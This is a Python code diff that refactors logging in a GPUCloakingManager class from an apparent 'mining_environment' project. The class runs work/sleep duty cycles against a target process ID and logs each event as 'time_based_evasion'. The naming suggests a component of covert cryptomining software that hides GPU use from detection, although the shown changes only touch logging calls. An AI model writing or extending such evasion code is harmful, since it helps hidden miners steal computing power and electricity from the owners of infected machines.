@@ -59,14 +59,22 @@ def log_gpu_feature(*_args, **_kwargs):  # type: ignore
     """Telemetry logging functionality has been removed"""
     pass
 
-# Import Timing logger (đúng mapping cho time_based_manager)  
+# Import Timing logger và domain functions (đúng mapping cho time_based_manager)  
 try:
-    from ...scripts.module_loggers import get_timing_logger
+    from ...scripts.module_loggers import (
+        get_timing_logger,
+        log_time_based_evasion
+    )
     logger = get_timing_logger()
+    # Tạo reference cho gpu_cloak_logger vì code cũ vẫn dùng
+    gpu_cloak_logger = logger
 except ImportError:
     # Fallback nếu không có logger
     import logging
     logger = logging.getLogger(__name__)
+    # Dummy function khi không import được
+    def log_time_based_evasion(*args, **kwargs):
+        logger.info(f"[TIME_BASED_EVASION] {' '.join(map(str, args))}")
 
 # ---------- logging ----------
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
@@ -354,32 +362,31 @@ class GPUCloakingManager(IGPUCloakService):
         try:
             if self._thread and self._thread.is_alive():
                 logger.warning("GPUCloakingManager đã chạy từ trước.")
-                gpu_cloak_logger.log_time_based_evasion(
-                    action="START",
-                    status="SUCCESS",
-                    target_pid=self.pid,
-                    error_details="Already running"
+                log_time_based_evasion(
+                    window_type="runtime",
+                    action="START - Already running",
+                    duration=None,
+                    level="WARNING"
                 )
                 return True  # ✅ Already running counts as success
             
             # ✅ Validate target PID before starting
             if not self.is_process_alive():
                 logger.error(f"❌ Target PID {self.pid} is not alive - cannot start time_based_manager")
-                gpu_cloak_logger.log_time_based_evasion(
-                    action="START",
-                    status="FAILED",
-                    target_pid=self.pid,
-                    error_details=f"Target PID {self.pid} not alive"
+                log_time_based_evasion(
+                    window_type="runtime",
+                    action=f"START FAILED - Target PID {self.pid} not alive",
+                    duration=None,
+                    level="ERROR"
                 )
                 return False
             
             logger.info("🚀 Khởi động GPUCloakingManager cho PID %d", self.pid)
-            gpu_cloak_logger.log_time_based_evasion(
-                action="START",
-                status="SUCCESS",
-                work_ms=self.work_ms,
-                sleep_ms=self.sleep_ms,
-                target_pid=self.pid
+            log_time_based_evasion(
+                window_type="runtime",
+                action=f"START SUCCESS - Work: {self.work_ms}ms, Sleep: {self.sleep_ms}ms, PID: {self.pid}",
+                duration=None,
+                level="INFO"
             )
             
             # ✅ Start the duty cycle thread
@@ -399,11 +406,11 @@ class GPUCloakingManager(IGPUCloakService):
                 
         except Exception as e:
             logger.error(f"❌ Exception starting time_based_manager for PID {self.pid}: {e}")
-            gpu_cloak_logger.log_time_based_evasion(
-                action="START",
-                status="FAILED",
-                target_pid=self.pid,
-                error_details=str(e)
+            log_time_based_evasion(
+                window_type="runtime",
+                action=f"START FAILED - Exception: {str(e)}",
+                duration=None,
+                level="ERROR"
             )
             return False
 
